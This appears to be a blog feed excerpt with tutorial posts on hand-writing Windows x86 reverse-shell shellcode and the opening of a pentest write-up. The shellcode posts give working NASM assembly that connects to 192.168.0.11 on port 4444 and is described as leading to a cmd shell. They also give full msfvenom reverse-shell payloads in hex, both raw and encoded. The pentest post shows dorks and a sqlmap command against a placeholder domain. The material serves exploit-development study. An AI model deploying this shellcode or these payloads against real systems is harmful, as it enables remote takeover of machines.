&lt;p&gt;Notice the small trick here to push 3 bytes followed by a NULL terminator. A somewhat common idea is to do:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;.getConnect:
	xor eax, eax

	push byte 0x74	    ;'t'
	mov ax, 0x6365      ;'ce'
	push ax
	push 0x6e6e6f63     ;'nnoc'
	push esp	    ;pointer to the string

	push ebp	    ;socket handler
	
	mov ebx, 0x7c80ae40 ;addr of GetProcAddress
	call ebx
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;However, this would cause problems related to the stack alignment.&lt;/p&gt;

&lt;h2 id=&quot;call-connect&quot;&gt;Call connect&lt;/h2&gt;
&lt;p&gt;From the &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/desktop/api/winsock2/nf-winsock2-connect&quot;&gt;docs&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;The connect function establishes a connection to a specified socket.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;And the syntax:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;int WSAAPI connect(
  SOCKET         s,
  const sockaddr *name,
  int            namelen
);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;At this time we should have a socket handler stored in &lt;code class=&quot;highlighter-rouge&quot;&gt;edi&lt;/code&gt; and the address of &lt;code class=&quot;highlighter-rouge&quot;&gt;connect&lt;/code&gt; stored in &lt;code class=&quot;highlighter-rouge&quot;&gt;eax&lt;/code&gt;. Next step is to set up the &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/desktop/WinSock/sockaddr-2&quot;&gt;sockaddr struct&lt;/a&gt;:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;struct sockaddr {
        ushort  sa_family;
        char    sa_data[14];
};

struct sockaddr_in {
        short   sin_family;
        u_short sin_port;
        struct  in_addr sin_addr;
        char    sin_zero[8];
};
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;sockaddr&lt;/code&gt; is somewhat like a polymorphism where the actual type of structure to be used migh vary. In our case we want to use &lt;code class=&quot;highlighter-rouge&quot;&gt;sockaddr_in&lt;/code&gt;, which is the specific structure for TCP connections. In short, we must push the IP in hex format, then the port and finally the family.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;.callConnect
	;set up sockaddr_in
	mov ebx, 0x1c11b9d1	;the IP plus 0x11111111 so we avoid NULLs (IP=192.168.0.11)
	sub ebx, 0x11111111	;subtract from ebx to obtain the real IP
	push ebx		;push sin_addr
	push word 0x5c11	;0x115c = (port 4444)

	xor ebx, ebx
	mov bl, 2
	push bx	
	mov edx, esp

	push byte 0x10
	push edx
	push edi

	call eax
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This time we had to use another trick to encode the IP, which contains NULLs. The solution was to add the value &lt;code class=&quot;highlighter-rouge&quot;&gt;0x11111111&lt;/code&gt; to it and then subtract to get the correct IP.&lt;/p&gt;

&lt;p&gt;Here it is the complete code so far:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;global _start

section .text

_start:

.loadWinSock:
	xor eax, eax

	mov ax, 0x3233			;23
	push eax			;includes \0 at the end without insert NULLs
	push 0x5f327377 		;_2sw
	push esp			;pointer to the string

	mov ebx, 0x7c801d7b		;addr of LoadLibraryA (0x7c801d7b)
	call ebx

	mov ebp, eax			;save winsock handle

.getWSAStartup:
	xor eax, eax

	mov ax, 0x7075          	;'up'
	push eax
	push 0x74726174         	;'trat'
	push 0x53415357         	;'SASW'
	push esp	            	;pointer to the string

	push ebp	            	;winsock handler
	
	mov ebx, 0x7c80ae40     	;addr of GetProcAddress
	call ebx

.callWSAStartUp:
	xor ebx, ebx
	mov bx, 0x0190
	sub esp, ebx
	push esp
	xor ecx, ecx
	mov cx, 0x0202
	push ecx

	call eax		        ;WSAStartUp(MAKEWORD(2, 2), wsadata_pointer)


.getWSASocketA:
	xor eax, eax

	mov ax, 0x4174          	;'At'
	push eax
	push 0x656b636f         	;'ekco'
	push 0x53415357         	;'SASW'
	push esp	            	;pointer to the string

	push ebp	           	;socket handler
	
	mov ebx, 0x7c80ae40     	;addr of GetProcAddress
	call ebx

.callWSASocketA:
	xor ebx, ebx		    	;clear ebx
	push ebx;		        ;dwFlags=NULL
	push ebx;		        ;g=NULL
	push ebx;		        ;lpProtocolInfo=NULL
	
	xor ecx, ecx		    	;clear ecx
	mov cl, 0x6		        ;protocol=6
	push ecx

	inc ebx			        ;ebx==1
	push ebx		        ;type=1
	inc ebx			        ;af=2
	push ebx

	call eax		        ;call WSASocketA

	push eax		        ;save eax in edx
	pop edi

.getConnect:
	xor eax, eax

	mov eax, 0x74636590     	;'\x90tce'
	shr eax, 8
	push eax
	push 0x6e6e6f63         	;'nnoc'
	push esp	            	;pointer to the string

	push ebp	            	;socket handler
	
	mov ebx, 0x7c80ae40     	;addr of GetProcAddress
	call ebx

.callConnect
	;set up sockaddr_in
	mov ebx, 0x1c11b9d1		;the IP plus 0x11111111 so we avoid NULLs (IP=192.168.0.11)
	sub ebx, 0x11111111		;subtract from ebx to obtain the real IP
	push ebx			;push sin_addr
	push word 0x5c11		;0x115c = (port 4444)

	xor ebx, ebx
	mov bl, 2
	push bx	
	mov edx, esp

	push byte 0x10
	push edx
	push edi

	call eax
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After running it we get:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/media/manualshellcode/shellcode_connect.png&quot; alt=&quot;3-dbg5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In the next part we will finally redirect &lt;code class=&quot;highlighter-rouge&quot;&gt;cmd&lt;/code&gt; to our socket and get our complete shellcode.&lt;/p&gt;

</description>
				<pubDate>Sun, 21 Oct 2018 00:00:00 -0300</pubDate>
				<link>/re/exploit/2018/10/21/windows-manual-shellcode-part2.html</link>
				<guid isPermaLink="true">/re/exploit/2018/10/21/windows-manual-shellcode-part2.html</guid>
			</item>
		
			<item>
				<title>Windows x86 Manual Shellcode - Part 1</title>
				<description>&lt;p&gt;In this series we are going to write a Reverse Shell shellcode for Win32 from scratch while trying to reduce its size.&lt;/p&gt;

&lt;p&gt;For achieving this goal, we will make this shellcode specific to Windows XP SP3 (English). This is necessary for we will hardcode some API functions addresses instead of dinamycally finding them.&lt;/p&gt;

&lt;p&gt;Our shellcode will do pretty much the same as &lt;a href=&quot;http://sh3llc0d3r.com/windows-reverse-shell-shellcode-i/&quot;&gt;this&lt;/a&gt; one:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Load ws2_32.dll with LoadLibraryA&lt;/li&gt;
  &lt;li&gt;Get WSAStartup with GetProcAddress&lt;/li&gt;
  &lt;li&gt;Call WSAStartup&lt;/li&gt;
  &lt;li&gt;Get WSASocketA with GetProcAddress&lt;/li&gt;
  &lt;li&gt;Call WSASocketA&lt;/li&gt;
  &lt;li&gt;Get connect with GetProcAddress&lt;/li&gt;
  &lt;li&gt;Call connect&lt;/li&gt;
  &lt;li&gt;Call CreateProcessA&lt;/li&gt;
  &lt;li&gt;Call ExitProcess (optional)&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;It all starts with our &lt;code class=&quot;highlighter-rouge&quot;&gt;shellcode.s&lt;/code&gt; file:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;global _start

section .text

_start:
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This part defines a global variable &lt;code class=&quot;highlighter-rouge&quot;&gt;_start&lt;/code&gt;, which is the default entry point for nasm. When we assemble this file, nasm will search for &lt;code class=&quot;highlighter-rouge&quot;&gt;_start&lt;/code&gt; so if we were not using this tag we would need to pass &lt;code class=&quot;highlighter-rouge&quot;&gt;-e myentrypointtag&lt;/code&gt; parameter to the assembler.&lt;/p&gt;

&lt;p&gt;We also define that what we are writing is the &lt;code class=&quot;highlighter-rouge&quot;&gt;.text&lt;/code&gt; section. This section holds the instructions to be executed.&lt;/p&gt;

&lt;h2 id=&quot;assembling-and-linking&quot;&gt;Assembling and linking&lt;/h2&gt;

&lt;p&gt;Before we dive into our code let me say how we will transform it into a Windows executable file (.exe). Since I am developing the code in my Debian 9, here is what I do to assemble and link the &lt;code class=&quot;highlighter-rouge&quot;&gt;shellcode.s&lt;/code&gt; file:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ nasm -f win32 shellcode.s -o  shellcode.o
$ ld -m i386pe shellcode.o -o shared/shellcode.exe
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;shared&lt;/code&gt; folder is shared (duh) with my Windows XP VM. This way I can develop the code in Linux and easily test it in Windows. 
Now lets move to the good stuff!&lt;/p&gt;

&lt;h2 id=&quot;finding-api-calls-addresses&quot;&gt;Finding API calls addresses&lt;/h2&gt;
&lt;p&gt;As I stated above, we will use static addresses for the necessary API calls. We are actually trading off portability by lenght, which is what we want in this case.
The tool of choice here is &lt;code class=&quot;highlighter-rouge&quot;&gt;arwin.c&lt;/code&gt;. You can find the code &lt;a href=&quot;http://www.vividmachines.com/shellcode/arwin.c&quot;&gt;here&lt;/a&gt;. In order to compile it from Linux we install MinGW32:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ sudo apt install mingw32
[...]
$ i686-w64-mingw32-gcc arwin.c -o shared/arwin.exe
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;That said and done, lets find all the addresses we are going to need.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/media/manualshellcode/shellcode_arwin.png&quot; alt=&quot;1-arwin&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;load-ws2_32dll-with-loadlibrarya&quot;&gt;Load ws2_32.dll with LoadLibraryA&lt;/h2&gt;
&lt;p&gt;As stated &lt;a href=&quot;http://www.hick.org/code/skape/papers/win32-shellcode.pdf&quot;&gt;here&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;In actuality, ws2_32.dll is likely already loaded in memory. The problem is, though, that one does not know where in memory it has been loaded at. As such, one can make use of LoadLibraryA to find out where it has been loaded at. If it has yet to be loaded, LoadLibraryA will simply load it and return the address it is mapped in at.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;So if you are going, for example, to use this shellcode as a backdoor or in an exploit, please consider if the following snippet is really necessary. In most cases it won’t be.&lt;/p&gt;

&lt;p&gt;Lets check &lt;code class=&quot;highlighter-rouge&quot;&gt;LoadLibraryA&lt;/code&gt; syntax:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HMODULE LoadLibraryA(
  LPCSTR lpLibFileName
);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;If you have ever questioned why MS provides both LoadLibraryA an LoadLibraryW, do check &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/desktop/LearnWin32/working-with-strings&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Notice we want the string &lt;code class=&quot;highlighter-rouge&quot;&gt;ws2_32&lt;/code&gt; to be used by the &lt;code class=&quot;highlighter-rouge&quot;&gt;LoadLibraryA&lt;/code&gt; function as the &lt;code class=&quot;highlighter-rouge&quot;&gt;lpLibFileName&lt;/code&gt; parameter.&lt;/p&gt;

&lt;p&gt;Something tricky about manually writing shellcodes, however, is that one must take care when dealing with parameters on the stack. There are 3 points to consider about pushing strings onto the stack:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Litte endianess&lt;/li&gt;
  &lt;li&gt;Reverse order&lt;/li&gt;
  &lt;li&gt;End with \0&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;So if we are pushing  &lt;code class=&quot;highlighter-rouge&quot;&gt;ws2_32&lt;/code&gt; we first divide it in 32 bits words like &lt;code class=&quot;highlighter-rouge&quot;&gt;ws2_&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;32\0\0&lt;/code&gt; (more on this later). Now we put it in little endian notation as &lt;code class=&quot;highlighter-rouge&quot;&gt;_2sw&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;\0\023&lt;/code&gt;. Next we push it in reverse order: first &lt;code class=&quot;highlighter-rouge&quot;&gt;_2sw&lt;/code&gt; followed by &lt;code class=&quot;highlighter-rouge&quot;&gt;\0\023&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Our stack will look like&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;_2sw  &amp;lt;&amp;lt;&amp;lt;\ESP
\0\023
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;But what about point 3? As you probably know, strings in C are nothing more than an array of chars, terminated with &lt;code class=&quot;highlighter-rouge&quot;&gt;\0&lt;/code&gt;. This is actually a problem for us since doing so would insert NULL bytes into our shellcode, which may truncate it. In fact, what we did above will probably not work.&lt;/p&gt;

&lt;p&gt;We need to insert a &lt;code class=&quot;highlighter-rouge&quot;&gt;\0&lt;/code&gt; rigth after &lt;code class=&quot;highlighter-rouge&quot;&gt;ws2_32&lt;/code&gt; without actually mentioning the character &lt;code class=&quot;highlighter-rouge&quot;&gt;\0&lt;/code&gt;! Sounds weird huh? There are a few ways to manage this issue though. One of them is the following:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;.loadWinSock:
	xor eax, eax

	mov ax, 0x3233			;23
	push eax		  	;push with \0 at the end without inserting NULLs
	push 0x5f327377 		;_2sw
	push esp			;pointer to the string

	mov ebx, 0x7c801d7b		;0x7b1d807c  	;addr of LoadLibraryA (0x7c801d7b)
	call ebx

	mov ebp, eax			;save winsock handle
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;.loadWinSock&lt;/code&gt; is just a label that has no practical effect but to help documenting the code. We use &lt;code class=&quot;highlighter-rouge&quot;&gt;xor eax eax&lt;/code&gt; to zero out &lt;code class=&quot;highlighter-rouge&quot;&gt;eax&lt;/code&gt; register, which will be necessary for the next instructions.
Take a look at &lt;code class=&quot;highlighter-rouge&quot;&gt;mov ax, 0x3233&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;push eax&lt;/code&gt;. You might be wondering why did we use a register to push a value. I mean, we could had used &lt;code class=&quot;highlighter-rouge&quot;&gt;push 0x3233&lt;/code&gt;, right? The problem is that the rest of the 32 bits word would be padded with NULLs. Although that is just what we need, it would also mean our shellcode would contain NULL bytes, which is not what we want. However, when we do &lt;code class=&quot;highlighter-rouge&quot;&gt;mov ax, 0x3233&lt;/code&gt;, we set the lowest 16bits of &lt;code class=&quot;highlighter-rouge&quot;&gt;eax&lt;/code&gt;, while the rest is filled with zeros (remember we zeroed &lt;code class=&quot;highlighter-rouge&quot;&gt;eax&lt;/code&gt;
before?). Now we have &lt;code class=&quot;highlighter-rouge&quot;&gt;eax as &lt;/code&gt;\0\023&lt;code class=&quot;highlighter-rouge&quot;&gt;! The rest of the string is straight forward, just &lt;/code&gt;push 0x5f327377&lt;code class=&quot;highlighter-rouge&quot;&gt;.
Finally, notice the &lt;/code&gt;push esp&lt;code class=&quot;highlighter-rouge&quot;&gt; instruction. What we pass to the &lt;/code&gt;LoadLibraryA&lt;code class=&quot;highlighter-rouge&quot;&gt; function is not the file name string, but a **pointer** to it. Since our string is right on the top of the stack, &lt;/code&gt;esp` is exactly what we need.&lt;/p&gt;

&lt;p&gt;Lets extract the opcodes for our shellcode:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ objdump -d shared/shellcode.exe -M intel32
[...]
00401000 &amp;lt;_start&amp;gt;:
  401000:	31 c0                	xor    eax,eax
  401002:	66 b8 33 32          	mov    ax,0x3233
  401006:	50                   	push   eax
  401007:	68 77 73 32 5f       	push   0x5f327377
  40100c:	54                   	push   esp
  40100d:	bb 7b 1d 80 7c       	mov    ebx,0x7c801d7b
  401012:	ff d3                	call   ebx
  401014:	89 c5                	mov    ebp,eax
[...]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Awesome, no NULLs.
Here it is how it would be had we pushed the string directly:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	push 0x00003233        ; Push the bytes 'ws2_32',0,0 onto the stack.
	push 0x5F327377        ; ...
	push esp               ; Push a pointer to the &quot;ws2_32&quot; string on the stack.
	push 0x0726774C        ; hash( &quot;kernel32.dll&quot;, &quot;LoadLibraryA&quot; )
	call ebp               ; LoadLibraryA( &quot;ws2_32&quot; )
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;00401000 &amp;lt;_start&amp;gt;:
  401000:	68 33 32 00 00       	push   0x3233
  401005:	68 77 73 32 5f       	push   0x5f327377
  40100a:	54                   	push   esp
  40100b:	68 4c 77 26 07       	push   0x726774c
  401010:	ff d5                	call   ebp
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;OMG NULLs! We would probably need to encode this shellcode to remove them, which would imply in a longer shellcode.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;The last snippet was extracted from &lt;a href=&quot;https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_reverse_tcp.asm&quot;&gt;Metasploit’s shellcode&lt;/a&gt;.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Take a look at a reverse shell payload generated with Metasploit:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp -f hex
No encoder or badchars specified, outputting raw payload
Payload size: 324 bytes
Final size of hex file: 648 bytes
fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d6833320000687773325f54684c772607ffd5b89001000029c454506829806b00ffd5505050504050405068ea0fdfe0ffd5976a0568c0a8000b680200115c89e66a1056576899a57461ffd585c0740cff4e0875ec68f0b5a256ffd568636d640089e357575731f66a125956e2fd66c744243c01018d442410c60044545056565646564e565653566879cc3f86ffd589e04e5646ff306808871d60ffd5bbf0b5a25668a695bd9dffd53c067c0a80fbe07505bb4713726f6a0053ffd5
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/media/manualshellcode/shellcode_meme1.png&quot; alt=&quot;2-meme1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;See? Lots of NULLs, including the ones from &lt;code class=&quot;highlighter-rouge&quot;&gt;68 33 32 00 00&lt;/code&gt;. Let’s remove them:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp -f hex -b '\x00'
Found 10 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of hex file: 702 bytes
bfa87a2e36d9e1d97424f45829c9b152317812037812834086ccc36c9f932c8c60f4a5695134d1fac28491aeee6ff75a641dd06dcda80640ce817bc34cd8af236c13a222a94e4f766204e26607503f0d5b7447f22c7766a5272ea844eb5ae15ee867bbd5da1c3a3f13dc917e9b2feb471cd09eb15e6d99061ca92c9c863a967836ee410b345b0553595acae865d7ed3eeca3c99ab47073bb10d68cdbfa87289017d340fb7f106903803efa70b2e1501efe6a7fd90141c775fc6a385c3b3e68f6ea3fe30612eaa456bc4505067c36ed4c73690d6f5902a48a0aed9194c185e394c4096d728ca13b2d395b66a5d8a4bcc0db2f333595c73e2542287517c537a33f89aa28bfc4d6e6e88129ff7c3c13a962bdc592261a361ca7ef023ab7298a06e3e5ddd05d40b492371a6b7ddfdb47be99e38d484555780d7a5aec9903868c66de02bc2c422255e91776380ac2b54589e645b2918340fe1578396ff07eee90d1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Metasploit encodes the shellcode with &lt;a href=&quot;https://marcosvalle.github.io/re/exploit/2018/08/25/shikata-ga-nai.html&quot;&gt;shikata-ga-nai&lt;/a&gt; in order to remove the NULL bytes, which adds &lt;strong&gt;27&lt;/strong&gt; more bytes.&lt;/p&gt;

&lt;p&gt;But enough of automated tools, lets come back to our rudimental shellcode.&lt;/p&gt;

&lt;h2 id=&quot;get-wsastartup-with-getprocaddress&quot;&gt;Get WSAStartup with GetProcAddress&lt;/h2&gt;
&lt;p&gt;Now that we have WinSock DLL loaded, next step is to get WSAStartup address so we can call it. From &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/desktop/api/winsock/nf-winsock-wsastartup&quot;&gt;MSDN&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;The WSAStartup function initiates use of the Winsock DLL by a process.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;We use GetProcAddress for it. Here it is its syntax:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;FARPROC GetProcAddress(
  HMODULE hModule,
  LPCSTR  lpProcName
);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Since we have saved the returned handle from WinSock in &lt;code class=&quot;highlighter-rouge&quot;&gt;ebp&lt;/code&gt;, we can use it now.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;.getWSAStartup:
	xor eax, eax

	mov ax, 0x7075      ; 'pu'
	push eax
	push 0x74726174     ; 'trat'
	push 0x53415357     ; 'SASW'
	push esp	    ;pointer to the string

	push ebp	    ;winsock handler
	
	mov ebx, 0x7c80ae40 ;addr of GetProcAddress
	call ebx
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Lets take a break, compile this code and see how things look like in Immunity Debugger:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/media/manualshellcode/shellcode_dbg1.png&quot; alt=&quot;3-dbg1&quot; /&gt;
&lt;img src=&quot;http://localhost:4000/assets/media/manualshellcode/shellcode_dbg2.png&quot; alt=&quot;4-dbg2&quot; /&gt;
&lt;img src=&quot;http://localhost:4000/assets/media/manualshellcode/shellcode_dbg3.png&quot; alt=&quot;5-dbg3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Great! In the next parts we will continue this development.&lt;/p&gt;
</description>
				<pubDate>Sat, 20 Oct 2018 00:00:00 -0300</pubDate>
				<link>/re/exploit/2018/10/20/windows-manual-shellcode-part1.html</link>
				<guid isPermaLink="true">/re/exploit/2018/10/20/windows-manual-shellcode-part1.html</guid>
			</item>
		
			<item>
				<title>From domain to shell in 48 minutes - hacking like a skiddo</title>
				<description>&lt;p&gt;During a recent pentest assessment my team and I were given the mission to look for vulnerabilities at web applications of a client domain. Although very simple and automated, we used a few tricks that made life easier and got us a shell in less than an hour.&lt;/p&gt;

&lt;p&gt;The nice thing is exactly that we did not use any mind blowing tools, 0-days, sophisticated social engineering or whatever. Using only an indirect approach and putting together both basic theory and some practical knowledge of the employed tools, we could own a critical server and exfiltrate sensitive data.&lt;/p&gt;

&lt;h1 id=&quot;subdomain-enumeration&quot;&gt;Subdomain enumeration&lt;/h1&gt;
&lt;p&gt;Our client main web application seemed to be strongly hardened so we decided for an indirect approach. We listed all subdomains we could using &lt;code class=&quot;highlighter-rouge&quot;&gt;Google Dorks&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;amass&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;sublist3r&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;dnsrecon&lt;/code&gt;. This dork was very useful:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;site:domain.com -inurl:www
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;amass&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;sublist3r&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;dnsrecon&lt;/code&gt; gave us lots of interesting results. After filtering the repeated values and checking which were still online (many were not), we finished our targets list.&lt;/p&gt;

&lt;h1 id=&quot;the-low-hanging-fruit&quot;&gt;The low hanging fruit&lt;/h1&gt;
&lt;p&gt;Although most of the client’s web applications were reasonably safe, one of them called our attention. It was clearly a legacy web site of a forgotten event hosted by the company years ago. Nevertheless, it was still there, just waiting for being compromised.&lt;/p&gt;

&lt;p&gt;Since it was an old application, we were not surprised to discover it was build with plain PHP and no frameworks. Our first action was to navigate through the website, much like a regular user would do, while understanding what functionalities that site provided. I cannot stress enough how important interacting with the target site has been proving to be in our assessments. It gives you a whole different perspective and helps you mounting your attack tree.&lt;/p&gt;

&lt;p&gt;After a while we decided that a SQL Injection was a real possibility.&lt;/p&gt;

&lt;h1 id=&quot;sqlmap-ftw&quot;&gt;SQLmap FTW&lt;/h1&gt;
&lt;p&gt;Yes, I know, I know. Automated active tools are noisy, unreliable and made for infosec loosers. While all of this might be true, reinventing the wheel is never a good idea. Especially in the real world. With deadlines. And bosses. And children. You know.&lt;/p&gt;

&lt;h2 id=&quot;do-you-get-it&quot;&gt;Do you GET it?&lt;/h2&gt;
&lt;p&gt;We gave our Google-Fu another try with this dork:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;site:sub.domain.com ext:php
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;It brought us a few nice &lt;code class=&quot;highlighter-rouge&quot;&gt;?id=xxxx&lt;/code&gt; results. All was going well and we had real reasons to think this would be just that easy. However, it seemed that &lt;code class=&quot;highlighter-rouge&quot;&gt;id&lt;/code&gt; was not a vulnerable parameter at all. A little frustrating, indeed.&lt;/p&gt;

&lt;p&gt;Since we had spent some time playing around with the application, we knew there was an interesting search form in one page passing values through &lt;code class=&quot;highlighter-rouge&quot;&gt;POST&lt;/code&gt;. We filled the form with fake values, intercepted the request with Burp Suite and used the parameters within SQLmap:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sqlmap -u http://sub.domain.com/querydb.php --data=&quot;express=a&amp;amp;submit=Find&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We were immediately cut off.&lt;/p&gt;

